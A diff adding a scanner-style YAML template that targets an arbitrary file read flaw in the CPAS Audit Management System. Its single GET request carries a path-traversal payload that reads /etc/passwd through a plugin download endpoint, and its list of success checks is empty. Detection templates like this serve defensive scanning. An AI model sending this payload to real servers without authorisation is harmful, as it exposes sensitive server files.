@@ -1,0 +1,16 @@
+id: cpas-managment-lfi
+brief:
+    title: CPAS Management System - Arbitrary File Read
+    by: s4e-io
+    level: high
+    about: The CPAS Audit Management System has been found to contain a vulnerability that allows arbitrary file read. This security flaw can be exploited by attackers to access sensitive files on the server,...
+    label:
+        - cpas
+        - cms
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName'
+      signs: []
